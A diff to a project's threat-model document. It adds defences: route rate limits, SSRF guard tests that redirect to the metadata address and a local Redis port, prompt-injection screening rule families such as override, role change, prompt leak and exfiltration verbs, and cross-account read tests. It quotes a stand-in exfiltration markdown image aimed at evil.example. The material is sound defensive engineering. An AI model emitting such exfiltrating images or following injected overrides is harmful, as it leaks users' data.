@@ -64,6 +64,7 @@ running the desktop app (the owner is the operator there).
 | Spend abuse on public completions | Per-client (IPv6 /64) and global ceilings keyed on `request.ip`                                                                                                                         |
 | Forged webhooks                   | Slack HMAC over raw bytes, Bot Framework JWT for Teams, secret token for Telegram; each refuses when unconfigured; replies only to the verified service URL                             |
 | Session thief moving the account  | Changing the sign-in email needs the current password; security notices are emailed, an email change to the old address                                                                 |
+| Endless hammering of one route    | Fixed-window limits per route family, bucketed on the strongest identity (user, else API key hash, else address); `Retry-After` counts the window down rather than repeating it, and an idle-then-busy caller recovers exactly at the boundary (`tests/lib/rate-limit-window.test.ts`) |
 
 ### 4.2 User or model input → execution
 
@@ -84,11 +85,31 @@ private, loopback, link-local, CGNAT, multicast, reserved and IPv6 forms that em
 (mapped, NAT64, 6to4, IPv4-compatible), then pin the socket to the checked address; redirects are
 re-checked. The stealth browser routes every page request through it.
 
+The refusal is tested as the attack rather than as a function: `apps/api/tests/security/ssrf-guard.test.ts`
+walks a 302 to `169.254.169.254` and to `127.0.0.1:6379` and asserts the second hop was never
+fetched, caps a public redirect chain at five hops, and asserts that every route which fetches a
+caller-supplied URL (`kb`, `context`, `mcp-openapi`, `scraping-mcp`, `browser-agent`, `reactions`,
+`provider-keys`) goes through the guard — a correct guard that one route forgets is the bug that
+file exists to catch, so it also fails on any `redirect: "follow"` in the API's source.
+
 ### 4.4 Outside text → models
 
 Web pages, KB passages, webhook payloads and tool output are screened (`screenUntrusted`) and
 labelled untrusted in prompts. Prompt injection is mitigated, not prevented: whatever a model
 tries to execute still meets §4.2.
+
+Eleven rule families now cut instruction-like spans: override, role, prompt leak, chat-template
+delimiters, «forget everything above», persona assignment, tool calls, JSON `tool_calls`,
+secret requests, exfiltration verbs aimed at a URL, and remote markdown images. A model-backed
+classifier catches what the patterns miss when `NEXUS_INJECTION_CLASSIFIER` is set.
+
+`apps/api/tests/security/prompt-injection.test.ts` composes twenty hostile documents through the
+same function the council uses (`sourcesPrompt`) and asserts, per document, that the payload is
+gone from what the model would read while the untrusted-data note is present, that the excerpt
+still contributes its harmless text, and that composing the prompt makes **no outbound request**
+— a document carrying `![x](https://evil.example/steal?…)` is an exfiltration attempt only if
+something dereferences it. Documents stay raw at rest and are screened at prompt time, so the
+file asserts that order explicitly.
 
 ### 4.5 API ↔ data stores
 
@@ -98,6 +119,7 @@ tries to execute still meets §4.2.
 | Plaintext secrets at rest   | AES-256-GCM for provider keys, the secret store and TOTP secrets (`NEXUS_MFA_KEY`)                                   |
 | Audit log tampering         | HMAC chain with `NEXUS_AUDIT_KEY`; the security check fails when it falls back to the published default              |
 | Database in clear text      | The security check warns on a remote `DATABASE_URL` without `sslmode`                                                |
+| Cross-account read by id    | Every collection with item routes gets a fixture or a written reason to skip in `tests/security/cross-account.test.ts`; a new collection fails the census until it has one. Sandbox results are covered by `tests/routes/sandbox-owner.test.ts` |
 
 ### 4.6 Desktop shell
 
